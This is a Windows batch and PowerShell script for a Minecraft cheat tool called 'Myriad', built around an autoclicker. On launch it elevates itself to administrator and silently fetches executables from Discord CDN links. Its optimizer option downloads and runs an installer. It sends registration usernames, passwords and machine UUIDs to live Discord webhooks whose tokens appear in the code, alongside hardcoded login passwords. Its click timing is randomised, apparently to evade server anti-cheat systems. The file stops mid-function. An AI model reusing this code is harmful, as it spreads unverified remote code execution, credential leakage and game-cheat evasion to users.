<# ::
@echo off

::==============================================================

::==============================================================

::==============================================================

set title=Myriad
set version=0.01
set LUP=7/28/2023
set color=7

::==============================================================

set myriado=https://discord.com/api/webhooks/1078481721802117160/Ut6dXr_ptHTV29YFy_DXgcWMWPrZyvR3-yTWNckV6ldI08SUOvr-lIqD6T19ZtqeGbdY
set myriadr=https://discord.com/api/webhooks/1078481492507897857/aJU6MxafSO7lukSyTtb26OW5dBb5Pq5pv0aM5fGRqQuc-LgCh4wIUWk3lqeCMrrb_C4w

::==============================================================

set g=[92m
set r=[91m
set red=[04m
set l=[1m
set w=[0m
set b=[94m
set m=[95m
set p=[35m
set c=[35m
set d=[96m
set u=[0m
set z=[91m
set n=[96m
set y=[40;33m
set g2=[102m
set r2=[101m
set t=[40m


goto MyriadStart
::==============================================================

::==============================================================

::==============================================================

:MainMenu
cls
color %color%
title %title% > nul 2>&1
type MyriadLogo.txt
Batbox /h 0
Call Button 10 7 "Log in" 26 7 "Register" 18 11 "Contact" # Press
Getinput /m %Press% /h 70

:: Check for the pressed button 
if %errorlevel%==1 (goto Username)
if %errorlevel%==2 (goto Register)
if %errorlevel%==3 (goto Contact)
goto MainMenu

:Register
cls
color %color%
type MyriadLogo.txt
echo.
set /p usernamer=Username:
echo.
set /p passwordr=Password:
echo.
wmic path win32_computersystemproduct get uuid.
set /p uuidr=UUID [COPY]:
DCW.exe "%myriadr%" "**Myriad Registration:** Username: **%usernamer%** | Password: **%passwordr%** | UUID: **%uuidr%**" "Myriad Logs" > nul 2>&1
cls
color %color%
type MyriadLogo.txt
echo.
echo.
echo.
echo.
echo.
echo           %u%[%g%+%u%] %g%Successfully registered.
timeout /t 3 >nul & cls & goto MainMenu

:Contact
cls
color %color% > nul 2>&1
type MyriadLogo.txt
echo.
echo.
echo.
echo.
echo.
echo                      %b% Done.
start https://namemc.com/profile/Xhays > nul 2>&1
timeout /t 3 >nul & cls & goto MainMenu


:Username
cls
color %color%
type MyriadLogo.txt
echo.
echo.
set /p username=Username:
echo.
set /p password=Password:
if %username% == xhays if %password% == 220207 goto UUIDREGISTER
if %username% == awuen if %password% == sapo goto UUIDREGISTER
if %username% == havackas if %password% == JoaPas2019xD goto UUIDREGISTER
if %username% == BANSHEL if %password% == xhaysXbanshel goto LoginMENU

goto ERROR
echo.
echo.
:ERROR
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                    E
ping localhost -n 1 > nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                    E R
ping localhost -n 1 > nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                    E R R
ping localhost -n 1 > nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                    E R R O
ping localhost -n 1 > nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                    E R R O R
ping localhost -n 2 > nul
cls
goto MainMenu

::==============================================================
:LoginMENU
cls
color %color%
title %title% > nul 2>&1
type MyriadLogo.txt
Batbox /h 0
Call Button 7 9 "AutoClicker" 27 9 "Optimizers" # Press
Getinput /m %Press% /h 70

if %errorlevel%==1 (goto ACMENU)
if %errorlevel%==2 (goto OPTIMIZER)
goto LoginMENU

:OPTIMIZER
cls
title %title% > nul 2>&1
curl -g -L -# -o https://cdn.discordapp.com/attachments/1029491599425671271/1137948846111076352/Myriad.zip "C:\Users\%username%\.lunarclient\settings\game\Myriad.zip"
powershell -NoProfile Expand-Archive 'C:\Users\%username%\.lunarclient\settings\game\Myriad.zip' -DestinationPath 'C:\Users\%username%\.lunarclient\settings\game\'
del /f /s /q "C:\Users\%username%\.lunarclient\settings\game\Myriad.zip"
del /f /s /q "%appdata%\.minecraft\optionsof.txt"
curl -g -L -# -o https://cdn.discordapp.com/attachments/1029491599425671271/1137948806508449872/optionsof.txt "%appdata%\.minecraft\optionsof.txt"
curl -g -L -# -o https://cdn.discordapp.com/attachments/1029491599425671271/1137948979892588564/Lunar_Client_Qt_Setup.exe "%localappdata%\Myriad\Lunar_Client_Qt_Setup.exe"
start "%localappdata%\Myriad\Lunar_Client_Qt_Setup.exe"
goto LoginMENU

:: LOGIN INFO
:XhaysINFO
DCW.exe "https://discord.com/api/webhooks/1078481721802117160/Ut6dXr_ptHTV29YFy_DXgcWMWPrZyvR3-yTWNckV6ldI08SUOvr-lIqD6T19ZtqeGbdY" "**Myriad** Logged by <@874794593332379668>" "Myriad Logs" > nul 2>&1
goto LoginMENU

:awuenINFO
DCW.exe "https://discord.com/api/webhooks/1078481721802117160/Ut6dXr_ptHTV29YFy_DXgcWMWPrZyvR3-yTWNckV6ldI08SUOvr-lIqD6T19ZtqeGbdY" "**Myriad** Logged by <@1079526044920455308>" "Myriad Logs" > nul 2>&1
goto LoginMENU

:havaINFO
DCW.exe "https://discord.com/api/webhooks/1078481721802117160/Ut6dXr_ptHTV29YFy_DXgcWMWPrZyvR3-yTWNckV6ldI08SUOvr-lIqD6T19ZtqeGbdY" "**Myriad** Logged by <@703776595378438235>" "Myriad Logs" > nul 2>&1
goto LoginMENU

:: =============================================================
:UUIDREGISTER

:XhaysUUID
set "XhaysW=A9ABB334-62B9-11EB-89B8-3C6409608300"
set "Blacklisted=00000000-0000-0000-0000-111111111111"

:: wmic csproduct get uuid
for /f "delims=" %%A in ('wmic csproduct get uuid /value ^| find "="') do (
    for /f "tokens=2 delims==" %%B in ("%%~A") do (
        set "serialnumber=%%B"
    )
)

if "%serialnumber%"=="!XhaysW!" goto XhaysINFO

:: =============================================================

:awuenUUID
set "awuenW=4D3FAA04-9443-E811-A4C3-9829A69842CD"
set "Blacklisted=00000000-0000-0000-0000-111111111111"

:: wmic csproduct get uuid
for /f "delims=" %%A in ('wmic csproduct get uuid /value ^| find "="') do (
    for /f "tokens=2 delims==" %%B in ("%%~A") do (
        set "serialnumber=%%B"
    )
)

if "%serialnumber%"=="!awuenW!" goto awuenINFO

:: =============================================================

:havaUUID
set "havaW=032E02B4-0499-0502-A406-B60700080009"
set "Blacklisted=00000000-0000-0000-0000-111111111111"

:: wmic csproduct get uuid
for /f "delims=" %%A in ('wmic csproduct get uuid /value ^| find "="') do (
    for /f "tokens=2 delims==" %%B in ("%%~A") do (
        set "serialnumber=%%B"
    )
)

if "%serialnumber%"=="!havaW!" goto havaINFO

:: =============================================================

DCW.exe "https://discord.com/api/webhooks/1078481721802117160/Ut6dXr_ptHTV29YFy_DXgcWMWPrZyvR3-yTWNckV6ldI08SUOvr-lIqD6T19ZtqeGbdY" "**Myriad** ALERT USER LEAKED" "Myriad Logs" > nul 2>&1
goto MainMenu

:MyriadLoading
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%.%r%%r2%...................%t%%w%
echo.
echo.
echo.
if not exist "%localappdata%\Myriad\DCW.exe" curl -g -L -# -o "%localappdata%\Myriad\DCW.exe" "https://cdn.discordapp.com/attachments/1029491599425671271/1134353095695016017/DCW.exe" > nul 2>&1
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%..%r%%r2%..................%t%%w%
echo.
echo.
echo.
if not exist "%localappdata%\Myriad\MyriadLogo.txt" curl -g -L -# -o "%localappdata%\Myriad\MyriadLogo.txt" "https://cdn.discordapp.com/attachments/1029491599425671271/1078486448686248026/MyriadLogo.txt" > nul 2>&1
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%...%r%%r2%.................%t%%w%
echo.
echo.
echo.
if not exist "%localappdata%\Myriad\batbox.exe" curl -g -L -# -o "%localappdata%\Myriad\batbox.exe" "https://cdn.discordapp.com/attachments/1029491599425671271/1029515150656553041/batbox.exe" > nul 2>&1
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%....%r%%r2%................%t%%w%
echo.
echo.
echo.
if not exist "%localappdata%\Myriad\Button.bat" curl -g -L -# -o "%localappdata%\Myriad\Button.bat" "https://cdn.discordapp.com/attachments/1029491599425671271/1029515155807162418/Button.bat" > nul 2>&1
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%.....%r%%r2%...............%t%%w%
echo.
echo.
echo.
if not exist "%localappdata%\Myriad\GetInput.exe" curl -g -L -# -o "%localappdata%\Myriad\GetInput.exe" "https://cdn.discordapp.com/attachments/1029491599425671271/1029515145690497105/GetInput.exe" > nul 2>&1
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%......%r%%r2%..............%t%%w%
echo.
echo.
echo.
if not exist "%localappdata%\Myriad\X.txt" curl -g -L -# -o "%localappdata%\Myriad\Myriad.m" "https://cdn.discordapp.com/attachments/1029491599425671271/1146177143559180459/Myriad.m" > nul 2>&1
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%.......%r%%r2%.............%t%%w%
echo.
echo.
echo.
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%........%r%%r2%............%t%%w%
echo.
echo.
echo.
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%.........%r%%r2%...........%t%%w%
echo.
echo.
echo.
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%..........%r%%r2%..........%t%%w%
echo.
echo.
echo.
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%...........%r%%r2%.........%t%%w%
echo.
echo.
echo.
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%............%r%%r2%........%t%%w%
echo.
echo.
echo.
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%.............%r%%r2%.......%t%%w%
echo.
echo.
echo.

::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%..............%r%%r2%......%t%%w%
echo.
echo.
echo.

::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%...............%r%%r2%.....%t%%w%
echo.
echo.
echo.

::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%................%r%%r2%....%t%%w%
echo.
echo.
echo.

::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%.................%r%%r2%...%t%%w%
echo.
echo.
echo.

::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%..................%r%%r2%..%t%%w%

::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%...................%r%%r2%.%t%%w%
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%....................%r%%r2%%t%%w%
goto MainMenu
::==============================================================










::==============================================================

::==============================================================

::==============================================================
:MyriadStart
Mode 48,16
title Administrator: Myriad

::==============================================================
SETLOCAL EnableDelayedExpansion
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set "DEL=%%a"
)

::==============================================================

Reg.exe add HKLM /F > nul 2>&1
if %errorlevel% neq 0 start "" /wait /I /min powershell -NoProfile -Command start -verb runas "'%~s0'" && exit /b

::==============================================================

title Administrator: Myriad > nul 2>&1
Mode 48,16 > nul 2>&1
cd "%localappdata%/Myriad" > nul 2>&1
goto MyriadLoading
::==============================================================

::==============================================================

::==============================================================




::==============================================================

:ColorText
echo off
<nul set /p ".=%DEL%" > "%~2"
findstr /v /a:%1 /R "^$" "%~2" nul
del "%~2" > nul 2>&1
goto :eof

::==============================================================









::==============================================================

:ACMENU
cd "%localappdata%/Myriad" > nul 2>&1
cls
mode 53,13
set /p TGL=Enter Toogle: 
::set "DEBUG=true"

::https://learn.microsoft.com/en-us/dotnet/api/system.consolekey
:: The key that is used to toggle the click on and off
set "KEY_TOGGLE=%TGL%"
:: The key that is used to disable the clicker after it has started to change profile
set "KEY_DISABLE=Delete"
:: The key that is used to hide the clicker window after it has started
set "KEY_HIDE=End"

set logocolor=[38;5;92m
set "lastinput="

title %nothing%
setlocal enableDelayedExpansion
set /a totalProfiles=0
goto init

:init
call :makeProfile "Legit" "[92m[SECURE][0m" "1" "Myriad.m"

goto list

:banner
cls
goto :eof

:list
call :banner
for /l %%a in (1,1,%totalProfiles%) do (
    echo %%a.[6G!profile[%%a]![31G!profile[%%a]_desc! [!profile[%%a]_defaultargs!]
)
echo.

goto main

:main
set /p "input=[?25h> "
if "%input%"=="%lastinput%" goto main
set "lastinput=%input%"

:: input system recode here
set /a counter=0
for %%a in (%input%) do (
    set "input[!counter!]=%%a"
    set /a counter+=1
)
set /a counter-=1

if not defined profile[!input[0]!] (
    echo '!input[0]!' is not a valid profile.
    goto main
)

set "profile=profile[!input[0]!]"
if %counter%==0 (
    call :start "!%profile%!" "!%profile%_defaultargs!"
) else if %counter% GEQ !%profile%_totalargs! (
    set "providedargs="
    for /l %%a in (1,1,!%profile%_totalargs!) do (
        if %%a==1 (set "providedargs=!input[%%a]!") else (set "providedargs=!providedargs! !input[%%a]!")
    )
    call :start "!%profile%!" "!providedargs!"
) else (
    echo Profile '!%profile%!' requires !%profile%_totalargs! arguments.
)

goto main

:: call :start <profile> <args>
:start
call :banner
echo Profile: %~1 [%~2]
call :run "%~1" "%KEY_TOGGLE% %KEY_HIDE% %KEY_DISABLE%" "%~2"
goto list

:: @makeProfile <name> <description> <total-args> <default-args>
::
:: The name must not have a space in it due to how the vars are done.
::
:: The name and args are parsed to the clicker and will determine what randomization to use and what values it should take in.
:: Arguments may differ depending on the randomization.
:makeProfile
set /a totalProfiles+=1
set "profile[!totalProfiles!]=%~1"
set "profile[!totalProfiles!]_desc=%~2"
set "profile[!totalProfiles!]_totalargs=%~3"
set "profile[!totalProfiles!]_defaultargs=%~4"

rem this is a shitty fix but i was having problems and this works
set "profile[%~1]=%~1"
set "profile[%~1]_desc=%~2"
set "profile[%~1]_totalargs=%~3"
set "profile[%~1]_defaultargs=%~4"

set "profile_%~1=!totalProfiles!"
goto :eof

:run
set "lastinput="
setlocal
set "POWERSHELL_BAT_ARGS=%*"
if defined POWERSHELL_BAT_ARGS set "POWERSHELL_BAT_ARGS=%POWERSHELL_BAT_ARGS:"=\"%"
endlocal & powershell -ExecutionPolicy Bypass -NoLogo -NoProfile -Command "$_ = $input; Invoke-Expression $( '$input = $_; $_ = \"\"; $args = @( &{ $args } %POWERSHELL_BAT_ARGS% );' + [String]::Join( [char]10, $( Get-Content \"%~f0\" ) ) )"
if defined DEBUG pause
goto :EOF
#>
$namespace = get-random
$class = get-random

$code = @"
using System;
using System.IO;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
namespace n$namespace
{
    public class c$class
    {
    
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        private static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowThreadProcessId(IntPtr handle, out int processId);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll")]
        public static extern IntPtr SendMessage(IntPtr hWnd, uint wMsg, UIntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        public static IntPtr MAKELPARAM(int p, int p_2)
        {
            return (IntPtr) ((p_2 << 16) | (p & 0xFFFF));
        }
        
        private static int GetKey(string s)
        {   
            return (int) Enum.Parse(typeof(ConsoleKey), s);
        }
        
        private static string GetKeyString(string s)
        {
            if (string.IsNullOrEmpty(s))
            {
                return string.Empty;
            }
            s = s.ToLower();
            s = char.ToUpper(s[0]) + s.Substring(1);
            return s;
        }
        
        private static long GetSystemTime()
        {
            return BitConverter.ToInt64(BitConverter.GetBytes(DateTimeOffset.Now.ToUnixTimeMilliseconds()), 0);
        }
        
        static Random rand;
        static string[] KeybindString = new string[3];
        static int[] Keybinds = new int[3];
        static bool ClickerEnabled;
        static bool WindowVisible;
        static int StatusRow;
        static IntPtr ConsoleWindow;
        static IntPtr ForegroundWindow;
        static IntPtr MCWindow;
        
        private static double GetRandomDouble(double minimum, double maximum)
        {
            return rand.NextDouble() * (maximum - minimum) + minimum;
        }
        
        public static void Init(string toggle, string hide, string disable) {
            KeybindString[0] = GetKeyString(toggle);
            KeybindString[1] = GetKeyString(hide);
            KeybindString[2] = GetKeyString(disable);
            Keybinds[0] = GetKey(KeybindString[0]);
            Keybinds[1] = GetKey(KeybindString[1]);
            Keybinds[2] = GetKey(KeybindString[2]);
            
            ClickerEnabled = true;
            WindowVisible = true;
            
            Console.WriteLine("");
            Console.WriteLine("Keybinds:");
            Console.WriteLine("  - Toggle Clicker: " + KeybindString[0]);
            Console.WriteLine("  - Hide/Show Window: " + KeybindString[1]);
            Console.WriteLine("  - Disable Clicker (Change Profile): " + KeybindString[2]);
            Console.WriteLine("");
        }
        
        public static void DrawStatus(int row, bool enabled)
        {
            Console.SetCursorPosition(1, row);
            Console.WriteLine("Status: " + (enabled ? "\x1b[92mEnabled \x1b[0m" : "\x1b[91mDisabled\x1b[0m"));
        }
        
        public static void DrawStatus(int row, bool enabled, string label, string value)
        {
            Console.SetCursorPosition(1, row);
            Console.WriteLine("Status: " + (enabled ? "\x1b[92mEnabled \x1b[0m" : "\x1b[91mDisabled\x1b[0m"));
            Console.SetCursorPosition(1, row + 1);
            Console.WriteLine(label + ": " + value + "   ");
        }
        
        public static void DrawStatus(int row, bool enabled, string label, int value)
        {
            Console.SetCursorPosition(1, row);
            Console.WriteLine("Status: " + (enabled ? "\x1b[92mEnabled \x1b[0m" : "\x1b[91mDisabled\x1b[0m"));
            Console.SetCursorPosition(1, row + 1);
            Console.WriteLine(label + ": " + value + "   ");
        }
        
        public static bool MinOverMaxCheck(int min, int max)
        {
            if (min > max)
            {
                Console.WriteLine("Minimum CPS cannot be over Maximum CPS");
                return true;
            }
            return false;
        }
        
        // KeyStates[0] = Left Mouse Button
        static bool[] KeyStates = new bool[3];
        static bool[] PrevKeyStates = new bool[3];
        
        public static bool Binds() {
            bool ReturnValue = true;
            PrevKeyStates[0] = KeyStates[0];
            KeyStates[0] = BitConverter.GetBytes(GetAsyncKeyState(Keybinds[0]))[1] == 0x80;
            PrevKeyStates[1] = KeyStates[1];
            KeyStates[1] = BitConverter.GetBytes(GetAsyncKeyState(Keybinds[1]))[1] == 0x80;
            PrevKeyStates[2] = KeyStates[2];
            KeyStates[2] = BitConverter.GetBytes(GetAsyncKeyState(Keybinds[2]))[1] == 0x80;
            
            // Toggle Clicker
            if (PrevKeyStates[0] != KeyStates[0] && KeyStates[0])
            {
                ClickerEnabled = !ClickerEnabled;
                DrawStatus(StatusRow, ClickerEnabled);
            }
            
            // Hide/Show Window
            if (PrevKeyStates[1] != KeyStates[1] && KeyStates[1])
            {
                WindowVisible = !WindowVisible;
                ShowWindow(ConsoleWindow, WindowVisible ? 5 : 0);
            }
            
            // Disable Clicker (Change Profile)
            if (PrevKeyStates[2] != KeyStates[2] && KeyStates[2])
            {
                ClickerEnabled = false;
                DrawStatus(StatusRow, ClickerEnabled);
                if (!WindowVisible) ShowWindow(ConsoleWindow, 5);
                ReturnValue = false;
            }
            return ReturnValue;
        }

        public static void NormalCPS(string[] args) {
            bool running = true;
            
            StatusRow = Console.CursorTop;
            
            int MinimumCPS = Int32.Parse(args[4]);
            int MaximumCPS = Int32.Parse(args[5]);
            if (MinOverMaxCheck(MinimumCPS, MaximumCPS)) return;
            
            long lastLoopRun = 0;
            long now = 0;
            long dif = 0;
            long lastDelay = 0;
            
            long cpsSpike = 0;
            long cpsDrop = 0;
            long lastEvent = -15;
            double sinX = 0;
            
            DrawStatus(StatusRow, ClickerEnabled);
            
            while (running)
            {
                ForegroundWindow = GetForegroundWindow();
                MCWindow = FindWindow("LWJGL", null);
                
                // Clicker code
                if (ClickerEnabled)
                {
                    if (BitConverter.GetBytes(GetAsyncKeyState(1))[1] == 0x80)
                    {
                        if (MCWindow == ForegroundWindow)
                        {
                            if (lastLoopRun == 0) {
                                lastLoopRun = GetSystemTime();
                            } else {
                                now = GetSystemTime();
                                dif = (now - lastLoopRun) >> 1;
                                dif -= lastDelay;
                                lastLoopRun = now;
                                
                                if (cpsDrop > 0) cpsDrop--;
                                if (cpsSpike > 0) cpsSpike--;
                                
                                if (lastEvent > 0) {
                                    if (rand.Next(0, 41 / (int) lastEvent) == 0) {
                                        cpsSpike = 20;
                                        lastEvent = -17;
                                    } else if (rand.Next(0, 67 / (int) lastEvent) == 0) {
                                        cpsDrop = 21;
                                        lastEvent = -16;
                                    }
                                }
                                
                                double minDelay = 1000 / MinimumCPS;
                                if (cpsSpike > 1)
                                    minDelay -= GetRandomDouble(1, 25);
                                double maxDelay = 1000 / MaximumCPS;
                                if (cpsDrop > 0)
                                    maxDelay += GetRandomDouble(1, 22);
                                double average = (maxDelay + minDelay) / 2;
                                double halfDifference = (minDelay - maxDelay) / 2;
                                double delay = Math.Sin(sinX) * halfDifference + average;
                                sinX += GetRandomDouble(GetRandomDouble(0.03, 0.1), GetRandomDouble(0.69, 1.24));
                                
                                // 0x0084 = WM_NCHITTEST
                                if (SendMessage(ForegroundWindow, 0x0084, UIntPtr.Zero, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y)) == (IntPtr) 1)
                                {
                                    lastDelay = (((int)delay) >> 1) - dif;
                                    if (lastDelay < 0 || lastDelay == Int32.MaxValue) lastDelay = 0;
                                    SendMessage(ForegroundWindow, 0x0201, (UIntPtr) 0x0001, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y));
                                    Thread.Sleep((int) lastDelay);
                                    SendMessage(ForegroundWindow, 0x0202, UIntPtr.Zero, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y));
                                    Thread.Sleep((int) lastDelay);
                                }
                                lastEvent++;
                            }
                        }
                    }
                }
                
                if (!Binds()) running = false;
            }
            return;
        }

        public static void AstralMC(string[] args) {
            bool running = true;
            
            StatusRow = Console.CursorTop;
            
            int MinimumCPS = Int32.Parse(args[4]);
            int MaximumCPS = Int32.Parse(args[5]);
            if (MinOverMaxCheck(MinimumCPS, MaximumCPS)) return;
            
            long lastLoopRun = 0;
            long now = 0;
            long dif = 0;
            long lastDelay = 0;
            
            long cpsSpike = 0;
            long cpsDrop = 0;
            long lastEvent = -15;
            double sinX = 0;
            
            DrawStatus(StatusRow, ClickerEnabled);
            
            while (running)
            {
                ForegroundWindow = GetForegroundWindow();
                MCWindow = FindWindow("LWJGL", null);
                
                // Clicker code
                if (ClickerEnabled)
                {
                    if (BitConverter.GetBytes(GetAsyncKeyState(1))[1] == 0x80)
                    {
                        if (MCWindow == ForegroundWindow)
                        {
                            if (lastLoopRun == 0) {
                                lastLoopRun = GetSystemTime();
                            } else {
                                now = GetSystemTime();
                                dif = (now - lastLoopRun) >> 1;
                                dif -= lastDelay;
                                lastLoopRun = now;
                                
                                if (cpsDrop > 0) cpsDrop--;
                                if (cpsSpike > 0) cpsSpike--;
                                
                                if (lastEvent > 0) {
                                    if (rand.Next(0, 41 / (int) lastEvent) == 0) {
                                        cpsSpike = 20;
                                        lastEvent = -17;
                                    } else if (rand.Next(0, 67 / (int) lastEvent) == 0) {
                                        cpsDrop = 21;
                                        lastEvent = -16;
                                    }
                                }
                                
                                double minDelay = 1000 / MinimumCPS;
                                if (cpsSpike > 1)
                                    minDelay -= GetRandomDouble(1, 25);
                                double maxDelay = 1000 / MaximumCPS;
                                if (cpsDrop > 0)
                                    maxDelay += GetRandomDouble(1, 22);
                                double average = (maxDelay + minDelay) / 2;
                                double halfDifference = (minDelay - maxDelay) / 2;
                                double delay = Math.Sin(sinX) * halfDifference + average;
                                sinX += GetRandomDouble(GetRandomDouble(0.03, 0.1), GetRandomDouble(0.69, 1.24));
                                
                                // 0x0084 = WM_NCHITTEST
                                if (SendMessage(ForegroundWindow, 0x0084, UIntPtr.Zero, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y)) == (IntPtr) 1)
                                {
                                    lastDelay = (((int)delay) >> 1) - dif;
                                    if (lastDelay < 0 || lastDelay == Int32.MaxValue) lastDelay = 0;
                                    SendMessage(ForegroundWindow, 0x0201, (UIntPtr) 0x0001, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y));
                                    Thread.Sleep((int) lastDelay);
                                    SendMessage(ForegroundWindow, 0x0202, UIntPtr.Zero, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y));
                                    Thread.Sleep((int) lastDelay);
                                }
                                lastEvent++;
                            }
                        }
                    }
                }
                
                if (!Binds()) running = false;
            }
            return;
        }

        public static void Minemen(string[] args) {
            bool running = true;
            
            StatusRow = Console.CursorTop;
            
            int MinimumCPS = Int32.Parse(args[4]);
            int MaximumCPS = Int32.Parse(args[5]);
            if (MinOverMaxCheck(MinimumCPS, MaximumCPS)) return;
            
            long lastLoopRun = 0;
            long now = 0;
            long dif = 0;
            long lastDelay = 0;
            
            long cpsSpike = 0;
            long cpsDrop = 0;
            long lastEvent = -15;
            double sinX = 1;
            
            DrawStatus(StatusRow, ClickerEnabled);
            
            while (running)
            {
                ForegroundWindow = GetForegroundWindow();
                MCWindow = FindWindow("LWJGL", null);
                
                // Clicker code
                if (ClickerEnabled)
                {
                    if (BitConverter.GetBytes(GetAsyncKeyState(1))[1] == 0x80)
                    {
                        if (MCWindow == ForegroundWindow)
                        {
                            if (lastLoopRun == 0) {
                                lastLoopRun = GetSystemTime();
                            } else {
                                now = GetSystemTime();
                                dif = (now - lastLoopRun) >> 1;
                                dif -= lastDelay;
                                lastLoopRun = now;
                                
                                if (cpsDrop > 0) cpsDrop--;
                                if (cpsSpike > 0) cpsSpike--;
                                
                                if (lastEvent > 0) {
                                    if (rand.Next(0, 100 / (int) lastEvent) == 0) {
                                        cpsSpike = 57;
                                        lastEvent = 20;
                                    } else if (rand.Next(0, 100 / (int) lastEvent) == 0) {
                                        cpsDrop = 74;
                                        lastEvent = 30;
                                    }
                                }
                                
                                double minDelay = 1000 / MinimumCPS;
                                if (cpsSpike > 0)
                                    minDelay -= GetRandomDouble(1, 15);
                                double maxDelay = 1000 / MaximumCPS;
                                if (cpsDrop > 0)
                                    maxDelay += GetRandomDouble(1, 15);
                                double average = (maxDelay + minDelay) / 2;
                                double halfDifference = (minDelay - maxDelay) / 2;
                                double delay = Math.Sin(sinX) * halfDifference + average;
                                sinX += GetRandomDouble(GetRandomDouble(0.37, 0.3), GetRandomDouble(0.84, 1.37));
                                
                                // 0x0084 = WM_NCHITTEST
                                if (SendMessage(ForegroundWindow, 0x0084, UIntPtr.Zero, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y)) == (IntPtr) 1)
                                {
                                    lastDelay = (((int)delay) >> 1) - dif;
                                    if (lastDelay < 0 || lastDelay == Int32.MaxValue) lastDelay = 0;
                                    SendMessage(ForegroundWindow, 0x0201, (UIntPtr) 0x0001, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y));
                                    Thread.Sleep((int) lastDelay);
                                    SendMessage(ForegroundWindow, 0x0202, UIntPtr.Zero, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y));
                                    Thread.Sleep((int) lastDelay);
                                }
                                lastEvent++;
                            }
                        }
                    }
                }
                
                if (!Binds()) running = false;
            }
            return;
        }

            public static void PvPLand(string[] args) {
            bool running = true;
            
            StatusRow = Console.CursorTop;
            
            int MinimumCPS = Int32.Parse(args[4]);
            int MaximumCPS = Int32.Parse(args[5]);
            if (MinOverMaxCheck(MinimumCPS, MaximumCPS)) return;
            
            long lastLoopRun = 0;
            long now = 0;
            long dif = 0;
            long lastDelay = 0;
            
            long cpsSpike = 0;
            long cpsDrop = 0;
            long lastEvent = -15;
            double sinX = 0;
            
            DrawStatus(StatusRow, ClickerEnabled);
            
            while (running)
            {
                ForegroundWindow = GetForegroundWindow();
                MCWindow = FindWindow("LWJGL", null);
                
                // Clicker code
                if (ClickerEnabled)
                {
                    if (BitConverter.GetBytes(GetAsyncKeyState(1))[1] == 0x80)
                    {
                        if (MCWindow == ForegroundWindow)
                        {
                            if (lastLoopRun == 0) {
                                lastLoopRun = GetSystemTime();
                            } else {
                                now = GetSystemTime();
                                dif = (now - lastLoopRun) >> 1;
                                dif -= lastDelay;
                                lastLoopRun = now;
                                
                                if (cpsDrop > 0) cpsDrop--;
                                if (cpsSpike > 0) cpsSpike--;
                                
                                if (lastEvent > 0) {
                                    if (rand.Next(0, 41 / (int) lastEvent) == 0) {
                                        cpsSpike = 20;
                                        lastEvent = -17;
